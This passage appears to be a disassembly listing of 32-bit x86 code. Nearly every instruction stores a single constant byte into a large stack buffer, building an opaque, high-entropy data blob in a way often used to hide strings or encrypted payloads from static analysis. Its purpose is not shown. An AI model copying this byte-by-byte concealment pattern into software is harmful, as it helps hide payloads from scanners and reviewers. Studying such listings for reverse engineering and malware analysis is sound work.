  405e0b:	c6 85 3f eb ff ff 4b 	mov    BYTE PTR [ebp-0x14c1],0x4b
  405e12:	c6 85 40 eb ff ff 88 	mov    BYTE PTR [ebp-0x14c0],0x88
  405e19:	c6 85 41 eb ff ff 44 	mov    BYTE PTR [ebp-0x14bf],0x44
  405e20:	c6 85 42 eb ff ff 24 	mov    BYTE PTR [ebp-0x14be],0x24
  405e27:	c6 85 43 eb ff ff 0c 	mov    BYTE PTR [ebp-0x14bd],0xc
  405e2e:	c6 85 44 eb ff ff c6 	mov    BYTE PTR [ebp-0x14bc],0xc6
  405e35:	c6 85 45 eb ff ff a4 	mov    BYTE PTR [ebp-0x14bb],0xa4
  405e3c:	c6 85 46 eb ff ff 04 	mov    BYTE PTR [ebp-0x14ba],0x4
  405e43:	c6 85 47 eb ff ff 3d 	mov    BYTE PTR [ebp-0x14b9],0x3d
  405e4a:	c6 85 48 eb ff ff 4e 	mov    BYTE PTR [ebp-0x14b8],0x4e
  405e51:	c6 85 49 eb ff ff 86 	mov    BYTE PTR [ebp-0x14b7],0x86
  405e58:	c6 85 4a eb ff ff a4 	mov    BYTE PTR [ebp-0x14b6],0xa4
  405e5f:	c6 85 4b eb ff ff d4 	mov    BYTE PTR [ebp-0x14b5],0xd4
  405e66:	c6 85 4c eb ff ff 4e 	mov    BYTE PTR [ebp-0x14b4],0x4e
  405e6d:	c6 85 4d eb ff ff 41 	mov    BYTE PTR [ebp-0x14b3],0x41
  405e74:	c6 85 4e eb ff ff 06 	mov    BYTE PTR [ebp-0x14b2],0x6
  405e7b:	c6 85 4f eb ff ff f4 	mov    BYTE PTR [ebp-0x14b1],0xf4
  405e82:	c6 85 50 eb ff ff 24 	mov    BYTE PTR [ebp-0x14b0],0x24
  405e89:	c6 85 51 eb ff ff 6f 	mov    BYTE PTR [ebp-0x14af],0x6f
  405e90:	c6 85 52 eb ff ff ed 	mov    BYTE PTR [ebp-0x14ae],0xed
  405e97:	c6 85 53 eb ff ff 38 	mov    BYTE PTR [ebp-0x14ad],0x38
  405e9e:	c6 85 54 eb ff ff c4 	mov    BYTE PTR [ebp-0x14ac],0xc4
  405ea5:	c6 85 55 eb ff ff e4 	mov    BYTE PTR [ebp-0x14ab],0xe4
  405eac:	c6 85 56 eb ff ff 10 	mov    BYTE PTR [ebp-0x14aa],0x10
  405eb3:	c6 85 57 eb ff ff 18 	mov    BYTE PTR [ebp-0x14a9],0x18
  405eba:	c6 85 58 eb ff ff dc 	mov    BYTE PTR [ebp-0x14a8],0xdc
  405ec1:	c6 85 59 eb ff ff d4 	mov    BYTE PTR [ebp-0x14a7],0xd4
  405ec8:	c6 85 5a eb ff ff f2 	mov    BYTE PTR [ebp-0x14a6],0xf2
  405ecf:	c6 85 5b eb ff ff 2a 	mov    BYTE PTR [ebp-0x14a5],0x2a
  405ed6:	c6 85 5c eb ff ff 2e 	mov    BYTE PTR [ebp-0x14a4],0x2e
  405edd:	c6 85 5d eb ff ff 60 	mov    BYTE PTR [ebp-0x14a3],0x60
  405ee4:	c6 85 5e eb ff ff 80 	mov    BYTE PTR [ebp-0x14a2],0x80
  405eeb:	c6 85 5f eb ff ff b0 	mov    BYTE PTR [ebp-0x14a1],0xb0
  405ef2:	c6 85 60 eb ff ff 66 	mov    BYTE PTR [ebp-0x14a0],0x66
  405ef9:	c6 85 61 eb ff ff 89 	mov    BYTE PTR [ebp-0x149f],0x89
  405f00:	c6 85 62 eb ff ff 44 	mov    BYTE PTR [ebp-0x149e],0x44
  405f07:	c6 85 63 eb ff ff 84 	mov    BYTE PTR [ebp-0x149d],0x84
  405f0e:	c6 85 64 eb ff ff 20 	mov    BYTE PTR [ebp-0x149c],0x20
  405f15:	c6 85 65 eb ff ff f6 	mov    BYTE PTR [ebp-0x149b],0xf6
  405f1c:	c6 85 66 eb ff ff 29 	mov    BYTE PTR [ebp-0x149a],0x29
  405f23:	c6 85 67 eb ff ff b4 	mov    BYTE PTR [ebp-0x1499],0xb4
  405f2a:	c6 85 68 eb ff ff a4 	mov    BYTE PTR [ebp-0x1498],0xa4
  405f31:	c6 85 69 eb ff ff de 	mov    BYTE PTR [ebp-0x1497],0xde
  405f38:	c6 85 6a eb ff ff 2b 	mov    BYTE PTR [ebp-0x1496],0x2b
  405f3f:	c6 85 6b eb ff ff 71 	mov    BYTE PTR [ebp-0x1495],0x71
  405f46:	c6 85 6c eb ff ff e6 	mov    BYTE PTR [ebp-0x1494],0xe6
  405f4d:	c6 85 6d eb ff ff 39 	mov    BYTE PTR [ebp-0x1493],0x39
  405f54:	c6 85 6e eb ff ff c4 	mov    BYTE PTR [ebp-0x1492],0xc4
  405f5b:	c6 85 6f eb ff ff f4 	mov    BYTE PTR [ebp-0x1491],0xf4
  405f62:	c6 85 70 eb ff ff 62 	mov    BYTE PTR [ebp-0x1490],0x62
  405f69:	c6 85 71 eb ff ff ca 	mov    BYTE PTR [ebp-0x148f],0xca
  405f70:	c6 85 72 eb ff ff b3 	mov    BYTE PTR [ebp-0x148e],0xb3
  405f77:	c6 85 73 eb ff ff 40 	mov    BYTE PTR [ebp-0x148d],0x40
  405f7e:	c6 85 74 eb ff ff 40 	mov    BYTE PTR [ebp-0x148c],0x40
  405f85:	c6 85 75 eb ff ff 60 	mov    BYTE PTR [ebp-0x148b],0x60
  405f8c:	c6 85 76 eb ff ff 46 	mov    BYTE PTR [ebp-0x148a],0x46
  405f93:	c6 85 77 eb ff ff 49 	mov    BYTE PTR [ebp-0x1489],0x49
  405f9a:	c6 85 78 eb ff ff 54 	mov    BYTE PTR [ebp-0x1488],0x54
  405fa1:	c6 85 79 eb ff ff e4 	mov    BYTE PTR [ebp-0x1487],0xe4
  405fa8:	c6 85 7a eb ff ff a4 	mov    BYTE PTR [ebp-0x1486],0xa4
  405faf:	c6 85 7b eb ff ff d8 	mov    BYTE PTR [ebp-0x1485],0xd8
  405fb6:	c6 85 7c eb ff ff 72 	mov    BYTE PTR [ebp-0x1484],0x72
  405fbd:	c6 85 7d eb ff ff 50 	mov    BYTE PTR [ebp-0x1483],0x50
  405fc4:	c6 85 7e eb ff ff a0 	mov    BYTE PTR [ebp-0x1482],0xa0
  405fcb:	88 9d 7f eb ff ff    	mov    BYTE PTR [ebp-0x1481],bl
  405fd1:	c6 85 80 eb ff ff 66 	mov    BYTE PTR [ebp-0x1480],0x66
  405fd8:	c6 85 81 eb ff ff 59 	mov    BYTE PTR [ebp-0x147f],0x59
  405fdf:	c6 85 82 eb ff ff a4 	mov    BYTE PTR [ebp-0x147e],0xa4
  405fe6:	c6 85 83 eb ff ff e4 	mov    BYTE PTR [ebp-0x147d],0xe4
  405fed:	c6 85 84 eb ff ff 26 	mov    BYTE PTR [ebp-0x147c],0x26
  405ff4:	c6 85 85 eb ff ff 8a 	mov    BYTE PTR [ebp-0x147b],0x8a
  405ffb:	c6 85 86 eb ff ff 4e 	mov    BYTE PTR [ebp-0x147a],0x4e
  406002:	c6 85 87 eb ff ff 40 	mov    BYTE PTR [ebp-0x1479],0x40
  406009:	88 9d 88 eb ff ff    	mov    BYTE PTR [ebp-0x1478],bl
  40600f:	c6 85 89 eb ff ff 10 	mov    BYTE PTR [ebp-0x1477],0x10
  406016:	c6 85 8a eb ff ff e6 	mov    BYTE PTR [ebp-0x1476],0xe6
  40601d:	c6 85 8b eb ff ff d9 	mov    BYTE PTR [ebp-0x1475],0xd9
  406024:	c6 85 8c eb ff ff 14 	mov    BYTE PTR [ebp-0x1474],0x14
  40602b:	c6 85 8d eb ff ff 64 	mov    BYTE PTR [ebp-0x1473],0x64
  406032:	c6 85 8e eb ff ff e8 	mov    BYTE PTR [ebp-0x1472],0xe8
  406039:	c6 85 8f eb ff ff 78 	mov    BYTE PTR [ebp-0x1471],0x78
  406040:	c6 85 90 eb ff ff 64 	mov    BYTE PTR [ebp-0x1470],0x64
  406047:	c6 85 91 eb ff ff e0 	mov    BYTE PTR [ebp-0x146f],0xe0
  40604e:	c6 85 92 eb ff ff 80 	mov    BYTE PTR [ebp-0x146e],0x80
  406055:	c6 85 93 eb ff ff d0 	mov    BYTE PTR [ebp-0x146d],0xd0
  40605c:	c6 85 94 eb ff ff cb 	mov    BYTE PTR [ebp-0x146c],0xcb
  406063:	c6 85 95 eb ff ff 31 	mov    BYTE PTR [ebp-0x146b],0x31
  40606a:	c6 85 96 eb ff ff 06 	mov    BYTE PTR [ebp-0x146a],0x6
  406071:	c6 85 97 eb ff ff 09 	mov    BYTE PTR [ebp-0x1469],0x9
  406078:	c6 85 98 eb ff ff cc 	mov    BYTE PTR [ebp-0x1468],0xcc
  40607f:	c6 85 99 eb ff ff 24 	mov    BYTE PTR [ebp-0x1467],0x24
  406086:	c6 85 9a eb ff ff 0e 	mov    BYTE PTR [ebp-0x1466],0xe
  40608d:	c6 85 9b eb ff ff 3b 	mov    BYTE PTR [ebp-0x1465],0x3b
  406094:	c6 85 9c eb ff ff 4c 	mov    BYTE PTR [ebp-0x1464],0x4c
  40609b:	c6 85 9d eb ff ff 14 	mov    BYTE PTR [ebp-0x1463],0x14
  4060a2:	c6 85 9e eb ff ff e8 	mov    BYTE PTR [ebp-0x1462],0xe8
  4060a9:	c6 85 9f eb ff ff 08 	mov    BYTE PTR [ebp-0x1461],0x8
  4060b0:	88 9d a0 eb ff ff    	mov    BYTE PTR [ebp-0x1460],bl
  4060b6:	c6 85 a1 eb ff ff 50 	mov    BYTE PTR [ebp-0x145f],0x50
  4060bd:	c6 85 a2 eb ff ff 26 	mov    BYTE PTR [ebp-0x145e],0x26
  4060c4:	c6 85 a3 eb ff ff 69 	mov    BYTE PTR [ebp-0x145d],0x69
  4060cb:	c6 85 a4 eb ff ff 04 	mov    BYTE PTR [ebp-0x145c],0x4
  4060d2:	c6 85 a5 eb ff ff 24 	mov    BYTE PTR [ebp-0x145b],0x24
  4060d9:	c6 85 a6 eb ff ff 8a 	mov    BYTE PTR [ebp-0x145a],0x8a
  4060e0:	c6 85 a7 eb ff ff c3 	mov    BYTE PTR [ebp-0x1459],0xc3
  4060e7:	c6 85 a8 eb ff ff c0 	mov    BYTE PTR [ebp-0x1458],0xc0
  4060ee:	c6 85 a9 eb ff ff 61 	mov    BYTE PTR [ebp-0x1457],0x61
  4060f5:	c6 85 aa eb ff ff 86 	mov    BYTE PTR [ebp-0x1456],0x86
  4060fc:	c6 85 ab eb ff ff a9 	mov    BYTE PTR [ebp-0x1455],0xa9
  406103:	c6 85 ac eb ff ff 54 	mov    BYTE PTR [ebp-0x1454],0x54
  40610a:	b0 ff                	mov    al,0xff
  40610c:	c6 85 ad eb ff ff f4 	mov    BYTE PTR [ebp-0x1453],0xf4
  406113:	c6 85 ae eb ff ff 90 	mov    BYTE PTR [ebp-0x1452],0x90
  40611a:	c6 85 af eb ff ff d6 	mov    BYTE PTR [ebp-0x1451],0xd6
  406121:	c6 85 b0 eb ff ff 89 	mov    BYTE PTR [ebp-0x1450],0x89
  406128:	c6 85 b1 eb ff ff 24 	mov    BYTE PTR [ebp-0x144f],0x24
  40612f:	c6 85 b2 eb ff ff 84 	mov    BYTE PTR [ebp-0x144e],0x84
  406136:	c6 85 b3 eb ff ff 84 	mov    BYTE PTR [ebp-0x144d],0x84
  40613d:	c6 85 b4 eb ff ff e8 	mov    BYTE PTR [ebp-0x144c],0xe8
  406144:	c6 85 b5 eb ff ff 57 	mov    BYTE PTR [ebp-0x144b],0x57
  40614b:	c6 85 b6 eb ff ff c1 	mov    BYTE PTR [ebp-0x144a],0xc1
  406152:	c6 85 b7 eb ff ff 10 	mov    BYTE PTR [ebp-0x1449],0x10
  406159:	88 9d b8 eb ff ff    	mov    BYTE PTR [ebp-0x1448],bl
  40615f:	c6 85 b9 eb ff ff cd 	mov    BYTE PTR [ebp-0x1447],0xcd
  406166:	c6 85 ba eb ff ff d4 	mov    BYTE PTR [ebp-0x1446],0xd4
  40616d:	c6 85 bb eb ff ff 74 	mov    BYTE PTR [ebp-0x1445],0x74
  406174:	c6 85 bc eb ff ff 54 	mov    BYTE PTR [ebp-0x1444],0x54
  40617b:	c6 85 bd eb ff ff f2 	mov    BYTE PTR [ebp-0x1443],0xf2
  406182:	88 85 be eb ff ff    	mov    BYTE PTR [ebp-0x1442],al
  406188:	c6 85 bf eb ff ff c5 	mov    BYTE PTR [ebp-0x1441],0xc5
  40618f:	c6 85 c0 eb ff ff 18 	mov    BYTE PTR [ebp-0x1440],0x18
  406196:	c6 85 c1 eb ff ff a0 	mov    BYTE PTR [ebp-0x143f],0xa0
  40619d:	c6 85 c2 eb ff ff e0 	mov    BYTE PTR [ebp-0x143e],0xe0
  4061a4:	c6 85 c3 eb ff ff c0 	mov    BYTE PTR [ebp-0x143d],0xc0
  4061ab:	c6 85 c4 eb ff ff d0 	mov    BYTE PTR [ebp-0x143c],0xd0
  4061b2:	c6 85 c5 eb ff ff bf 	mov    BYTE PTR [ebp-0x143b],0xbf
  4061b9:	c6 85 c6 eb ff ff b5 	mov    BYTE PTR [ebp-0x143a],0xb5
  4061c0:	c6 85 c7 eb ff ff 30 	mov    BYTE PTR [ebp-0x1439],0x30
  4061c7:	c6 85 c8 eb ff ff a0 	mov    BYTE PTR [ebp-0x1438],0xa0
  4061ce:	c6 85 c9 eb ff ff d0 	mov    BYTE PTR [ebp-0x1437],0xd0
  4061d5:	c6 85 ca eb ff ff c0 	mov    BYTE PTR [ebp-0x1436],0xc0
  4061dc:	c6 85 cb eb ff ff 3b 	mov    BYTE PTR [ebp-0x1435],0x3b
  4061e3:	c6 85 cc eb ff ff a8 	mov    BYTE PTR [ebp-0x1434],0xa8
  4061ea:	c6 85 cd eb ff ff ed 	mov    BYTE PTR [ebp-0x1433],0xed
  4061f1:	c6 85 ce eb ff ff 24 	mov    BYTE PTR [ebp-0x1432],0x24
  4061f8:	c6 85 cf eb ff ff 94 	mov    BYTE PTR [ebp-0x1431],0x94
  4061ff:	c6 85 d0 eb ff ff 58 	mov    BYTE PTR [ebp-0x1430],0x58
  406206:	c6 85 d1 eb ff ff 80 	mov    BYTE PTR [ebp-0x142f],0x80
  40620d:	88 85 d2 eb ff ff    	mov    BYTE PTR [ebp-0x142e],al
  406213:	c6 85 d3 eb ff ff 15 	mov    BYTE PTR [ebp-0x142d],0x15
  40621a:	c6 85 d4 eb ff ff 54 	mov    BYTE PTR [ebp-0x142c],0x54
  406221:	c6 85 d5 eb ff ff 10 	mov    BYTE PTR [ebp-0x142b],0x10
  406228:	88 9d d6 eb ff ff    	mov    BYTE PTR [ebp-0x142a],bl
  40622e:	c6 85 d7 eb ff ff 30 	mov    BYTE PTR [ebp-0x1429],0x30
  406235:	c6 85 d8 eb ff ff 0d 	mov    BYTE PTR [ebp-0x1428],0xd
  40623c:	c6 85 d9 eb ff ff 0c 	mov    BYTE PTR [ebp-0x1427],0xc
  406243:	c6 85 da eb ff ff 24 	mov    BYTE PTR [ebp-0x1426],0x24
  40624a:	c6 85 db eb ff ff 90 	mov    BYTE PTR [ebp-0x1425],0x90
  406251:	c6 85 dc eb ff ff 4b 	mov    BYTE PTR [ebp-0x1424],0x4b
  406258:	c6 85 dd eb ff ff 10 	mov    BYTE PTR [ebp-0x1423],0x10
  40625f:	c6 85 de eb ff ff 11 	mov    BYTE PTR [ebp-0x1422],0x11
  406266:	c6 85 df eb ff ff 86 	mov    BYTE PTR [ebp-0x1421],0x86
  40626d:	88 85 e0 eb ff ff    	mov    BYTE PTR [ebp-0x1420],al
  406273:	c6 85 e1 eb ff ff 25 	mov    BYTE PTR [ebp-0x141f],0x25
  40627a:	c6 85 e2 eb ff ff 88 	mov    BYTE PTR [ebp-0x141e],0x88
  406281:	c6 85 e3 eb ff ff 80 	mov    BYTE PTR [ebp-0x141d],0x80
  406288:	c6 85 e4 eb ff ff 80 	mov    BYTE PTR [ebp-0x141c],0x80
  40628f:	c6 85 e5 eb ff ff d0 	mov    BYTE PTR [ebp-0x141b],0xd0
  406296:	c6 85 e6 eb ff ff 2d 	mov    BYTE PTR [ebp-0x141a],0x2d
  40629d:	c6 85 e7 eb ff ff e4 	mov    BYTE PTR [ebp-0x1419],0xe4
  4062a4:	c6 85 e8 eb ff ff 24 	mov    BYTE PTR [ebp-0x1418],0x24
  4062ab:	c6 85 e9 eb ff ff a8 	mov    BYTE PTR [ebp-0x1417],0xa8
  4062b2:	c6 85 ea eb ff ff 52 	mov    BYTE PTR [ebp-0x1416],0x52
  4062b9:	c6 85 eb eb ff ff 2b 	mov    BYTE PTR [ebp-0x1415],0x2b
  4062c0:	c6 85 ec eb ff ff 78 	mov    BYTE PTR [ebp-0x1414],0x78
  4062c7:	c6 85 ed eb ff ff 66 	mov    BYTE PTR [ebp-0x1413],0x66
  4062ce:	c6 85 ee eb ff ff 7f 	mov    BYTE PTR [ebp-0x1412],0x7f
  4062d5:	c6 85 ef eb ff ff 17 	mov    BYTE PTR [ebp-0x1411],0x17
  4062dc:	c6 85 f0 eb ff ff 89 	mov    BYTE PTR [ebp-0x1410],0x89
  4062e3:	c6 85 f1 eb ff ff 34 	mov    BYTE PTR [ebp-0x140f],0x34
  4062ea:	c6 85 f2 eb ff ff a4 	mov    BYTE PTR [ebp-0x140e],0xa4
  4062f1:	c6 85 f3 eb ff ff 38 	mov    BYTE PTR [ebp-0x140d],0x38
  4062f8:	c6 85 f4 eb ff ff 8d 	mov    BYTE PTR [ebp-0x140c],0x8d
  4062ff:	c6 85 f5 eb ff ff 94 	mov    BYTE PTR [ebp-0x140b],0x94
  406306:	c6 85 f6 eb ff ff 04 	mov    BYTE PTR [ebp-0x140a],0x4
  40630d:	c6 85 f7 eb ff ff 44 	mov    BYTE PTR [ebp-0x1409],0x44
  406314:	c6 85 f8 eb ff ff d0 	mov    BYTE PTR [ebp-0x1408],0xd0
  40631b:	c6 85 f9 eb ff ff c6 	mov    BYTE PTR [ebp-0x1407],0xc6
  406322:	c6 85 fa eb ff ff 1f 	mov    BYTE PTR [ebp-0x1406],0x1f
  406329:	c6 85 fb eb ff ff e7 	mov    BYTE PTR [ebp-0x1405],0xe7
  406330:	c6 85 fc eb ff ff 8d 	mov    BYTE PTR [ebp-0x1404],0x8d
  406337:	c6 85 fd eb ff ff 3c 	mov    BYTE PTR [ebp-0x1403],0x3c
  40633e:	c6 85 fe eb ff ff 24 	mov    BYTE PTR [ebp-0x1402],0x24
  406345:	c6 85 ff eb ff ff 10 	mov    BYTE PTR [ebp-0x1401],0x10
  40634c:	c6 85 00 ec ff ff 51 	mov    BYTE PTR [ebp-0x1400],0x51
  406353:	c6 85 01 ec ff ff 56 	mov    BYTE PTR [ebp-0x13ff],0x56
  40635a:	c6 85 02 ec ff ff 69 	mov    BYTE PTR [ebp-0x13fe],0x69
  406361:	c6 85 03 ec ff ff 04 	mov    BYTE PTR [ebp-0x13fd],0x4
  406368:	c6 85 04 ec ff ff 24 	mov    BYTE PTR [ebp-0x13fc],0x24
  40636f:	c6 85 05 ec ff ff c4 	mov    BYTE PTR [ebp-0x13fb],0xc4
  406376:	c6 85 06 ec ff ff c0 	mov    BYTE PTR [ebp-0x13fa],0xc0
  40637d:	c6 85 07 ec ff ff b0 	mov    BYTE PTR [ebp-0x13f9],0xb0
  406384:	c6 85 08 ec ff ff 80 	mov    BYTE PTR [ebp-0x13f8],0x80
  40638b:	c6 85 09 ec ff ff 4f 	mov    BYTE PTR [ebp-0x13f7],0x4f
  406392:	c6 85 0a ec ff ff f7 	mov    BYTE PTR [ebp-0x13f6],0xf7
  406399:	c6 85 0b ec ff ff 7d 	mov    BYTE PTR [ebp-0x13f5],0x7d
  4063a0:	c6 85 0c ec ff ff 54 	mov    BYTE PTR [ebp-0x13f4],0x54
  4063a7:	c6 85 0d ec ff ff 44 	mov    BYTE PTR [ebp-0x13f3],0x44
  4063ae:	c6 85 0e ec ff ff 20 	mov    BYTE PTR [ebp-0x13f2],0x20
  4063b5:	c6 85 0f ec ff ff 92 	mov    BYTE PTR [ebp-0x13f1],0x92
  4063bc:	c6 85 10 ec ff ff 56 	mov    BYTE PTR [ebp-0x13f0],0x56
  4063c3:	c6 85 11 ec ff ff b9 	mov    BYTE PTR [ebp-0x13ef],0xb9
  4063ca:	c6 85 12 ec ff ff 64 	mov    BYTE PTR [ebp-0x13ee],0x64
  4063d1:	c6 85 13 ec ff ff 64 	mov    BYTE PTR [ebp-0x13ed],0x64
  4063d8:	c6 85 14 ec ff ff 48 	mov    BYTE PTR [ebp-0x13ec],0x48
  4063df:	c6 85 15 ec ff ff 20 	mov    BYTE PTR [ebp-0x13eb],0x20
  4063e6:	c6 85 16 ec ff ff a0 	mov    BYTE PTR [ebp-0x13ea],0xa0
  4063ed:	c6 85 17 ec ff ff 90 	mov    BYTE PTR [ebp-0x13e9],0x90
  4063f4:	c6 85 18 ec ff ff 7f 	mov    BYTE PTR [ebp-0x13e8],0x7f
  4063fb:	c6 85 19 ec ff ff c7 	mov    BYTE PTR [ebp-0x13e7],0xc7
  406402:	c6 85 1a ec ff ff e3 	mov    BYTE PTR [ebp-0x13e6],0xe3
  406409:	c6 85 1b ec ff ff 9c 	mov    BYTE PTR [ebp-0x13e5],0x9c
  406410:	c6 85 1c ec ff ff 24 	mov    BYTE PTR [ebp-0x13e4],0x24
  406417:	c6 85 1d ec ff ff 54 	mov    BYTE PTR [ebp-0x13e3],0x54
  40641e:	c6 85 1e ec ff ff 81 	mov    BYTE PTR [ebp-0x13e2],0x81
  406425:	c6 85 1f ec ff ff 0b 	mov    BYTE PTR [ebp-0x13e1],0xb
  40642c:	c6 85 20 ec ff ff f8 	mov    BYTE PTR [ebp-0x13e0],0xf8
  406433:	c6 85 21 ec ff ff ce 	mov    BYTE PTR [ebp-0x13df],0xce
  40643a:	c6 85 22 ec ff ff fc 	mov    BYTE PTR [ebp-0x13de],0xfc
  406441:	c6 85 23 ec ff ff eb 	mov    BYTE PTR [ebp-0x13dd],0xeb
  406448:	c6 85 24 ec ff ff 05 	mov    BYTE PTR [ebp-0x13dc],0x5
  40644f:	c6 85 25 ec ff ff 04 	mov    BYTE PTR [ebp-0x13db],0x4
  406456:	c6 85 26 ec ff ff ab 	mov    BYTE PTR [ebp-0x13da],0xab
  40645d:	c6 85 27 ec ff ff bd 	mov    BYTE PTR [ebp-0x13d9],0xbd
  406464:	c6 85 28 ec ff ff 90 	mov    BYTE PTR [ebp-0x13d8],0x90
  40646b:	c6 85 29 ec ff ff 10 	mov    BYTE PTR [ebp-0x13d7],0x10
  406472:	c6 85 2a ec ff ff 20 	mov    BYTE PTR [ebp-0x13d6],0x20
  406479:	88 9d 2b ec ff ff    	mov    BYTE PTR [ebp-0x13d5],bl
  40647f:	c6 85 2c ec ff ff 89 	mov    BYTE PTR [ebp-0x13d4],0x89
  406486:	c6 85 2d ec ff ff 64 	mov    BYTE PTR [ebp-0x13d3],0x64
  40648d:	c6 85 2e ec ff ff 44 	mov    BYTE PTR [ebp-0x13d2],0x44
  406494:	c6 85 2f ec ff ff 34 	mov    BYTE PTR [ebp-0x13d1],0x34
  40649b:	c6 85 30 ec ff ff 33 	mov    BYTE PTR [ebp-0x13d0],0x33
  4064a2:	c6 85 31 ec ff ff a6 	mov    BYTE PTR [ebp-0x13cf],0xa6
  4064a9:	c6 85 32 ec ff ff 0b 	mov    BYTE PTR [ebp-0x13ce],0xb
  4064b0:	c6 85 33 ec ff ff 2c 	mov    BYTE PTR [ebp-0x13cd],0x2c
  4064b7:	c6 85 34 ec ff ff 24 	mov    BYTE PTR [ebp-0x13cc],0x24
  4064be:	c6 85 35 ec ff ff 84 	mov    BYTE PTR [ebp-0x13cb],0x84
  4064c5:	c6 85 36 ec ff ff 11 	mov    BYTE PTR [ebp-0x13ca],0x11
  4064cc:	c6 85 37 ec ff ff 4f 	mov    BYTE PTR [ebp-0x13c9],0x4f
  4064d3:	c6 85 38 ec ff ff d4 	mov    BYTE PTR [ebp-0x13c8],0xd4
  4064da:	c6 85 39 ec ff ff 94 	mov    BYTE PTR [ebp-0x13c7],0x94
  4064e1:	c6 85 3a ec ff ff 5c 	mov    BYTE PTR [ebp-0x13c6],0x5c
  4064e8:	c6 85 3b ec ff ff f5 	mov    BYTE PTR [ebp-0x13c5],0xf5
  4064ef:	c6 85 3c ec ff ff c0 	mov    BYTE PTR [ebp-0x13c4],0xc0
  4064f6:	c6 85 3d ec ff ff a5 	mov    BYTE PTR [ebp-0x13c3],0xa5
  4064fd:	c6 85 3e ec ff ff 40 	mov    BYTE PTR [ebp-0x13c2],0x40
  406504:	c6 85 3f ec ff ff 0f 	mov    BYTE PTR [ebp-0x13c1],0xf
  40650b:	c6 85 40 ec ff ff d5 	mov    BYTE PTR [ebp-0x13c0],0xd5
  406512:	c6 85 41 ec ff ff f3 	mov    BYTE PTR [ebp-0x13bf],0xf3
  406519:	c6 85 42 ec ff ff 18 	mov    BYTE PTR [ebp-0x13be],0x18
  406520:	c6 85 43 ec ff ff d2 	mov    BYTE PTR [ebp-0x13bd],0xd2
  406527:	c6 85 44 ec ff ff 74 	mov    BYTE PTR [ebp-0x13bc],0x74
  40652e:	c6 85 45 ec ff ff 59 	mov    BYTE PTR [ebp-0x13bb],0x59
  406535:	c6 85 46 ec ff ff bf 	mov    BYTE PTR [ebp-0x13ba],0xbf
  40653c:	c6 85 47 ec ff ff 65 	mov    BYTE PTR [ebp-0x13b9],0x65
  406543:	c6 85 48 ec ff ff 83 	mov    BYTE PTR [ebp-0x13b8],0x83
  40654a:	c6 85 49 ec ff ff b8 	mov    BYTE PTR [ebp-0x13b7],0xb8
  406551:	c6 85 4a ec ff ff e3 	mov    BYTE PTR [ebp-0x13b6],0xe3
  406558:	c6 85 4b ec ff ff c4 	mov    BYTE PTR [ebp-0x13b5],0xc4
  40655f:	c6 85 4c ec ff ff d2 	mov    BYTE PTR [ebp-0x13b4],0xd2
  406566:	c6 85 4d ec ff ff 48 	mov    BYTE PTR [ebp-0x13b3],0x48
  40656d:	c6 85 4e ec ff ff d4 	mov    BYTE PTR [ebp-0x13b2],0xd4
  406574:	c6 85 4f ec ff ff f1 	mov    BYTE PTR [ebp-0x13b1],0xf1
  40657b:	88 9d 50 ec ff ff    	mov    BYTE PTR [ebp-0x13b0],bl
  406581:	c6 85 51 ec ff ff 20 	mov    BYTE PTR [ebp-0x13af],0x20
  406588:	88 85 52 ec ff ff    	mov    BYTE PTR [ebp-0x13ae],al
  40658e:	c6 85 53 ec ff ff a4 	mov    BYTE PTR [ebp-0x13ad],0xa4
  406595:	c6 85 54 ec ff ff 64 	mov    BYTE PTR [ebp-0x13ac],0x64
  40659c:	c6 85 55 ec ff ff 94 	mov    BYTE PTR [ebp-0x13ab],0x94
  4065a3:	c6 85 56 ec ff ff c0 	mov    BYTE PTR [ebp-0x13aa],0xc0
  4065aa:	c6 85 57 ec ff ff f0 	mov    BYTE PTR [ebp-0x13a9],0xf0
  4065b1:	88 9d 58 ec ff ff    	mov    BYTE PTR [ebp-0x13a8],bl
  4065b7:	c6 85 59 ec ff ff f6 	mov    BYTE PTR [ebp-0x13a7],0xf6
  4065be:	c6 85 5a ec ff ff 23 	mov    BYTE PTR [ebp-0x13a6],0x23
  4065c5:	c6 85 5b ec ff ff fe 	mov    BYTE PTR [ebp-0x13a5],0xfe
  4065cc:	c6 85 5c ec ff ff 14 	mov    BYTE PTR [ebp-0x13a4],0x14
  4065d3:	c6 85 5d ec ff ff 6c 	mov    BYTE PTR [ebp-0x13a3],0x6c
  4065da:	c6 85 5e ec ff ff 93 	mov    BYTE PTR [ebp-0x13a2],0x93
  4065e1:	c6 85 5f ec ff ff b8 	mov    BYTE PTR [ebp-0x13a1],0xb8
  4065e8:	88 9d 60 ec ff ff    	mov    BYTE PTR [ebp-0x13a0],bl
  4065ee:	c6 85 61 ec ff ff 88 	mov    BYTE PTR [ebp-0x139f],0x88
  4065f5:	c6 85 62 ec ff ff 40 	mov    BYTE PTR [ebp-0x139e],0x40
  4065fc:	88 9d 63 ec ff ff    	mov    BYTE PTR [ebp-0x139d],bl
  406602:	c6 85 64 ec ff ff cd 	mov    BYTE PTR [ebp-0x139c],0xcd
  406609:	c6 85 65 ec ff ff 44 	mov    BYTE PTR [ebp-0x139b],0x44
  406610:	c6 85 66 ec ff ff 44 	mov    BYTE PTR [ebp-0x139a],0x44
  406617:	c6 85 67 ec ff ff 38 	mov    BYTE PTR [ebp-0x1399],0x38
  40661e:	c6 85 68 ec ff ff 80 	mov    BYTE PTR [ebp-0x1398],0x80
  406625:	c6 85 69 ec ff ff 10 	mov    BYTE PTR [ebp-0x1397],0x10
  40662c:	c6 85 6a ec ff ff 40 	mov    BYTE PTR [ebp-0x1396],0x40
  406633:	c6 85 6b ec ff ff 42 	mov    BYTE PTR [ebp-0x1395],0x42
  40663a:	c6 85 6c ec ff ff 13 	mov    BYTE PTR [ebp-0x1394],0x13
  406641:	c6 85 6d ec ff ff ef 	mov    BYTE PTR [ebp-0x1393],0xef
  406648:	c6 85 6e ec ff ff 57 	mov    BYTE PTR [ebp-0x1392],0x57
  40664f:	c6 85 6f ec ff ff 3a 	mov    BYTE PTR [ebp-0x1391],0x3a
  406656:	c6 85 70 ec ff ff 04 	mov    BYTE PTR [ebp-0x1390],0x4
  40665d:	c6 85 71 ec ff ff 53 	mov    BYTE PTR [ebp-0x138f],0x53
  406664:	c6 85 72 ec ff ff ed 	mov    BYTE PTR [ebp-0x138e],0xed
  40666b:	c6 85 73 ec ff ff f4 	mov    BYTE PTR [ebp-0x138d],0xf4
  406672:	c6 85 74 ec ff ff 64 	mov    BYTE PTR [ebp-0x138c],0x64
  406679:	c6 85 75 ec ff ff 3c 	mov    BYTE PTR [ebp-0x138b],0x3c
  406680:	c6 85 76 ec ff ff e0 	mov    BYTE PTR [ebp-0x138a],0xe0
